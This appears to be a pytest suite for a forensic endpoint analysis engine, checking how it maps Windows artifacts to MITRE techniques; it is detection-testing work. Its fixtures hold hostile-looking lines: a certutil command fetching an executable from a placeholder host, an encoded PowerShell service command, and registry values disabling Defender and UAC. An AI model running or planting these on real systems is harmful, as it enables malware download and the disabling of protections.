"""
Unit Test Suite — Endpoint Analysis Engine
===========================================
Comprehensive unit and integration tests for EndpointAnalysisEngine and its 6 sub-analyzers:
- PersistenceAnalyzer
- FilesystemAnalyzer
- RegistryAnalyzer
- BrowserAnalyzer
- USBAnalyzer
- UserActivityAnalyzer
"""

import os
import ast
import pytest
from datetime import datetime, timezone
from unittest.mock import MagicMock

from preprocessing.schemas import Artifact, NormalizedFields
from preprocessing.fcr_engine.schemas import CorrelationRecord
from forensic_analysis.router import route_fcr
from forensic_analysis.schemas import Finding, finding_to_fir
from forensic_analysis.unified_store import UnifiedEvidenceStore
from forensic_analysis.orchestrator import process_fcr_batch, ENGINE_REGISTRY
from forensic_analysis.endpoint_analysis.endpoint_engine import EndpointAnalysisEngine
from forensic_analysis.endpoint_analysis.user_activity_analyzer import UserActivityAnalyzer
from fir.schemas import FIRFinding


def make_artifact(
    art_id: str,
    art_type: str,
    case_id: str = "CASE-END-101",
    source_tool: str = "regripper",
    norm_fields: dict = None,
    raw_fields: dict = None,
    ts: datetime = None
) -> Artifact:
    norm = NormalizedFields(**(norm_fields or {}))
    return Artifact(
        artifact_id=art_id,
        case_id=case_id,
        evidence_id="EVID-END-001",
        source_tool=source_tool,
        artifact_type=art_type,
        timestamp=ts or datetime.now(timezone.utc),
        normalized_fields=norm,
        raw_fields=raw_fields or {},
    )


def make_fcr(
    corr_id: str,
    art_ids: list[str],
    case_id: str = "CASE-END-101",
    rel_type: list[str] = None
) -> CorrelationRecord:
    effective_ids = list(art_ids)
    if len(effective_ids) < 2:
        effective_ids.append("A-DUMMY-PADDING-999")
    
    return CorrelationRecord(
        correlation_id=corr_id,
        case_id=case_id,
        artifact_ids=effective_ids,
        relationship_type=rel_type or ["temporal_proximity"],
        host="host-endpoint-1",
        source_count=len(effective_ids),
        distinct_artifact_types=len(effective_ids),
        confidence=0.85,
    )


# ── 1. Router Dispatch Tests ──────────────────────────────────────────────────

def test_endpoint_router_dispatch():
    art1 = make_artifact("A1", "prefetch_entry")
    art2 = make_artifact("A2", "registry_key")
    fcr = make_fcr("CORR-00101", ["A1", "A2"])
    store = {"A1": art1, "A2": art2}

    engines = route_fcr(fcr, store)
    assert engines == ["endpoint"]


def test_cross_domain_router_dispatch():
    art_net = make_artifact("A1", "network.dns")
    art_end = make_artifact("A2", "amcache_entry")
    fcr = make_fcr("CORR-00102", ["A1", "A2"])
    store = {"A1": art_net, "A2": art_end}

    engines = route_fcr(fcr, store)
    assert engines == ["endpoint", "network"]


# ── 2. PersistenceAnalyzer Tests ──────────────────────────────────────────────

def test_persistence_analyzer_positive():
    art_run = make_artifact(
        "A-RUN-1", "registry_key",
        norm_fields={
            "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "registry_value": "MalwareAutoStart",
            "registry_value_data": "C:\\Users\\Public\\AppData\\malware.exe",
        }
    )
    art_svc = make_artifact(
        "A-SVC-1", "registry_key",
        norm_fields={
            "registry_key": "HKLM\\System\\CurrentControlSet\\Services\\BadSvc",
            "process_command_line": "powershell.exe -e aW52b2tlLWV4cHJlc3Npb24=",
        }
    )
    art_task = make_artifact(
        "A-TASK-1", "scheduled_task",
        norm_fields={
            "process_name": "UpdateTask",
            "process_command_line": "cmd.exe /c certutil.exe -urlcache -f http://bad.com/a.exe C:\\Temp\\a.exe",
        }
    )
    art_wmi = make_artifact(
        "A-WMI-1", "wmi_event_consumer",
        norm_fields={
            "process_command_line": "powershell.exe -NoP -NonI -W Hidden -C Get-Process",
        },
        raw_fields={"Name": "BackdoorConsumer"}
    )

    fcr = make_fcr("CORR-00103", ["A-RUN-1", "A-SVC-1", "A-TASK-1", "A-WMI-1"])
    store = {"A-RUN-1": art_run, "A-SVC-1": art_svc, "A-TASK-1": art_task, "A-WMI-1": art_wmi}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)

    layers = [f.layer for f in findings]
    assert all(l == "endpoint.persistence_analyzer" for l in layers)

    mitre_set = {f.mitre_mapping for f in findings}
    assert "T1547.001" in mitre_set  # Run key
    assert "T1543.003" in mitre_set  # Service
    assert "T1053.005" in mitre_set  # Scheduled Task
    assert "T1546.003" in mitre_set  # WMI Event Consumer


def test_persistence_analyzer_negative():
    art_clean_run = make_artifact(
        "A-CLEAN-RUN", "registry_key",
        norm_fields={
            "registry_key": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "registry_value": "OneDrive",
            "registry_value_data": "C:\\Program Files\\Microsoft OneDrive\\OneDrive.exe /background",
        }
    )
    fcr = make_fcr("CORR-00104", ["A-CLEAN-RUN"])
    store = {"A-CLEAN-RUN": art_clean_run}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 0


# ── 3. FilesystemAnalyzer Tests ───────────────────────────────────────────────

def test_filesystem_analyzer_execution_vs_existence_semantics():
    # Prefetch -> Execution Indicated
    art_pf = make_artifact("A-PF", "prefetch_entry", norm_fields={"process_name": "powershell.exe"}, raw_fields={"RunCount": 5})
    # Amcache -> Presence / Registration
    art_am = make_artifact("A-AM", "amcache_entry", norm_fields={"process_name": "malware.exe", "hash": "a1b2c3d4e5f6"})
    # ShimCache -> Cache Presence (NOT execution)
    art_shim = make_artifact("A-SHIM", "shimcache_entry", norm_fields={"process_name": "test.exe"})
    # MFT Deleted -> Deletion Record
    art_mft = make_artifact("A-MFT", "mft_entry", norm_fields={"file_name": "secret.doc", "deleted": True})

    fcr = make_fcr("CORR-00105", ["A-PF", "A-AM", "A-SHIM", "A-MFT"])
    store = {"A-PF": art_pf, "A-AM": art_am, "A-SHIM": art_shim, "A-MFT": art_mft}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 4

    pf_finding = next(f for f in findings if f.source_artifact_id == "A-PF")
    assert "execution indicated" in pf_finding.fact.lower()
    assert pf_finding.mitre_mapping == "T1059"

    am_finding = next(f for f in findings if f.source_artifact_id == "A-AM")
    assert "presence/registration" in am_finding.fact.lower()
    assert am_finding.mitre_mapping is None  # Does NOT claim execution

    shim_finding = next(f for f in findings if f.source_artifact_id == "A-SHIM")
    assert "not guaranteed execution" in shim_finding.fact.lower()
    assert shim_finding.mitre_mapping is None

    mft_finding = next(f for f in findings if f.source_artifact_id == "A-MFT")
    assert "deletion record" in mft_finding.fact.lower()
    assert mft_finding.mitre_mapping == "T1070.004"


def test_filesystem_analyzer_negative():
    art_mft_clean = make_artifact("A-MFT-CLEAN", "mft_entry", norm_fields={"file_name": "readme.txt", "deleted": False})
    fcr = make_fcr("CORR-00106", ["A-MFT-CLEAN"])
    store = {"A-MFT-CLEAN": art_mft_clean}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 1
    assert findings[0].severity == "informational"
    assert findings[0].mitre_mapping is None


# ── 4. RegistryAnalyzer Tests ─────────────────────────────────────────────────

def test_registry_analyzer_security_overrides():
    art_def = make_artifact(
        "A-DEF", "registry_key",
        norm_fields={
            "registry_key": "HKLM\\Software\\Policies\\Microsoft\\Windows Defender",
            "registry_value": "DisableAntiSpyware",
            "registry_value_data": "1",
        }
    )
    art_uac = make_artifact(
        "A-UAC", "registry_key",
        norm_fields={
            "registry_key": "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System",
            "registry_value": "EnableLUA",
            "registry_value_data": "0",
        }
    )

    fcr = make_fcr("CORR-00107", ["A-DEF", "A-UAC"])
    store = {"A-DEF": art_def, "A-UAC": art_uac}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 2
    assert all(f.severity == "high" for f in findings)
    assert all(f.mitre_mapping == "T1562.001" for f in findings)


# ── 5. BrowserAnalyzer Tests ──────────────────────────────────────────────────

def test_browser_analyzer_visited_vs_downloaded_semantics():
    art_visit = make_artifact("A-VISIT", "browser_history", norm_fields={"url": "http://malicious.xyz/phish", "domain": "malicious.xyz"})
    art_down = make_artifact("A-DOWN", "browser_download", norm_fields={"file_name": "payload.exe", "url": "http://bad.com/payload.exe"})
    art_norm = make_artifact("A-NORM", "browser_history", norm_fields={"url": "https://google.com", "domain": "google.com"})

    fcr = make_fcr("CORR-00108", ["A-VISIT", "A-DOWN", "A-NORM"])
    store = {"A-VISIT": art_visit, "A-DOWN": art_down, "A-NORM": art_norm}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 2

    visit_f = next(f for f in findings if f.source_artifact_id == "A-VISIT")
    assert "page navigation/visit, not malicious execution" in visit_f.fact.lower()
    assert visit_f.severity == "medium"
    assert visit_f.mitre_mapping == "T1071.001"

    down_f = next(f for f in findings if f.source_artifact_id == "A-DOWN")
    assert "download to disk, not execution" in down_f.fact.lower()
    assert down_f.severity == "high"
    assert down_f.mitre_mapping == "T1204.002"


# ── 6. USBAnalyzer Tests ──────────────────────────────────────────────────────

def test_usb_analyzer_semantics():
    art_usb = make_artifact(
        "A-USB", "usb_device",
        norm_fields={"rule_name": "SanDisk Cruzer"},
        raw_fields={"vendor_id": "0781", "product_id": "5581", "serial": "123456789", "drive_letter": "E:"}
    )
    fcr = make_fcr("CORR-00109", ["A-USB"])
    store = {"A-USB": art_usb}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 1
    f = findings[0]
    assert "not file transfer or exfiltration" in f.fact.lower()
    assert f.mitre_mapping == "T1091"
    assert f.metadata["vendor_id"] == "0781"


# ── 7. UserActivityAnalyzer Tests ─────────────────────────────────────────────

def test_user_activity_analyzer_rot13_decoding():
    # ROT13 encoded "cmd.exe" is "pzq.rkr"
    rot13_cmd = UserActivityAnalyzer.decode_rot13("pzq.rkr")
    assert rot13_cmd == "cmd.exe"

    art_ua = make_artifact(
        "A-UA", "registry.userassist",
        norm_fields={"process_name": "pzq.rkr"},
        raw_fields={"run_count": 12}
    )
    art_sb = make_artifact("A-SB", "shellbag_entry", norm_fields={"file_path": "C:\\Users\\Administrator\\Desktop\\SecretFolder"})

    fcr = make_fcr("CORR-00110", ["A-UA", "A-SB"])
    store = {"A-UA": art_ua, "A-SB": art_sb}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    assert len(findings) == 2

    ua_f = next(f for f in findings if f.source_artifact_id == "A-UA")
    assert "cmd.exe" in ua_f.fact
    assert ua_f.mitre_mapping == "T1083"


# ── 8. Robustness, Malformed Artifacts & Missing Fields ───────────────────────

def test_malformed_artifacts_and_missing_fields():
    art_empty = Artifact(
        artifact_id="A-EMPTY",
        case_id="CASE-END-101",
        evidence_id="EVID-1",
        source_tool="test",
        artifact_type="prefetch_entry",
        timestamp=datetime.now(timezone.utc),
        normalized_fields=NormalizedFields(),
        raw_fields={}
    )
    fcr = make_fcr("CORR-00111", ["A-EMPTY"])
    store = {"A-EMPTY": art_empty}

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr], store)
    # Empty prefetch artifact shouldn't crash engine
    assert isinstance(findings, list)


# ── 9. Overlapping FCR Deduplication & Provenance Merging ──────────────────────

def test_overlapping_fcr_deduplication_and_provenance_merging():
    art_pf = make_artifact("A-PF-DEDUP", "prefetch_entry", norm_fields={"process_name": "powershell.exe"}, raw_fields={"RunCount": 3})
    art_dummy = make_artifact("A-DUMMY-PADDING-999", "prefetch_entry", norm_fields={"process_name": "dummy.exe"})
    store = {"A-PF-DEDUP": art_pf, "A-DUMMY-PADDING-999": art_dummy}

    fcr1 = CorrelationRecord(
        correlation_id="CORR-00112",
        case_id="CASE-END-101",
        artifact_ids=["A-PF-DEDUP", "A-DUMMY-PADDING-999"],
        relationship_type=["shared_ioc"],
        shared_value="powershell.exe",
        host="host-endpoint-1",
        source_count=2,
        distinct_artifact_types=1,
        confidence=0.85,
    )
    fcr2 = CorrelationRecord(
        correlation_id="CORR-00113",
        case_id="CASE-END-101",
        artifact_ids=["A-PF-DEDUP", "A-DUMMY-PADDING-999"],
        relationship_type=["temporal_proximity"],
        host="host-endpoint-1",
        source_count=2,
        distinct_artifact_types=1,
        confidence=0.85,
    )

    engine = EndpointAnalysisEngine()
    findings = engine.analyze([fcr1, fcr2], store)

    assert len(findings) >= 1
    finding = next(f for f in findings if f.source_artifact_id == "A-PF-DEDUP")
    assert "CORR-00112" in finding.contributing_correlation_ids
    assert "CORR-00113" in finding.contributing_correlation_ids

    fir_finding = finding_to_fir(finding)
    assert isinstance(fir_finding.evidence_reference, list)
    assert "CORR-00112" in fir_finding.evidence_reference
    assert "CORR-00113" in fir_finding.evidence_reference


# ── 10. Orchestrator Batch Integration & FIR Handoff ───────────────────────────

def test_process_fcr_batch_endpoint_integration():
    art = make_artifact(
        "A-ORCH-END", "prefetch_entry", case_id="CASE-ORCH-END",
        norm_fields={"process_name": "certutil.exe"}
    )
    art_dummy = make_artifact("A-DUMMY-PADDING-999", "prefetch_entry", case_id="CASE-ORCH-END", norm_fields={"process_name": "dummy.exe"})
    fcr = make_fcr("CORR-00114", ["A-ORCH-END", "A-DUMMY-PADDING-999"], case_id="CASE-ORCH-END")
    mock_fir_repo = MagicMock()
    test_store = UnifiedEvidenceStore()

    result_findings = process_fcr_batch(
        case_id="CASE-ORCH-END",
        fcr_objects=[fcr],
        artifacts_by_id={"A-ORCH-END": art, "A-DUMMY-PADDING-999": art_dummy},
        fir_repo=mock_fir_repo,
        store=test_store
    )

    assert len(result_findings) >= 1
    assert result_findings[0].layer == "endpoint.filesystem_analyzer"

    # Check store
    stored = test_store.read_findings("CASE-ORCH-END")
    assert len(stored) >= 1

    # Check FIR repo insert
    assert mock_fir_repo.insert.call_count == 2
    inserted_fir = mock_fir_repo.insert.call_args_list[0][0][0]
    assert isinstance(inserted_fir, FIRFinding)
    assert inserted_fir.case_id == "CASE-ORCH-END"
    assert inserted_fir.evidence_reference == ["CORR-00114"]


# ── 11. Security AST Scan ──────────────────────────────────────────────────────

def test_ast_security_inspection():
    """
    Verifies that all files in forensic_analysis/endpoint_analysis contain 0 unsafe patterns:
    eval=0, exec=0, shell=True=0, os.system=0, unsafe pickle/yaml=0.
    """
    endpoint_dir = os.path.join(os.path.dirname(__file__), "..", "..", "forensic_analysis", "endpoint_analysis")
    python_files = []
    for root, _, files in os.walk(endpoint_dir):
        for f in files:
            if f.endswith(".py"):
                python_files.append(os.path.join(root, f))

    assert len(python_files) >= 7

    for filepath in python_files:
        with open(filepath, "r", encoding="utf-8-sig") as f:
            code = f.read()

        tree = ast.parse(code, filename=filepath)
        assert tree is not None

        for node in ast.walk(tree):
            if isinstance(node, ast.Call):
                if isinstance(node.func, ast.Name):
                    assert node.func.id not in ("eval", "exec"), f"Forbidden call '{node.func.id}' in {filepath}"
                elif isinstance(node.func, ast.Attribute):
                    if node.func.attr == "system" and isinstance(node.func.value, ast.Name) and node.func.value.id == "os":
                        pytest.fail(f"Forbidden os.system call found in {filepath}")
                    if node.func.attr == "loads" and isinstance(node.func.value, ast.Name) and node.func.value.id == "pickle":
                        pytest.fail(f"Forbidden pickle.loads call found in {filepath}")

                for kw in node.keywords:
                    if kw.arg == "shell" and isinstance(kw.value, ast.Constant) and kw.value.value is True:
                        pytest.fail(f"Forbidden shell=True argument found in {filepath}")
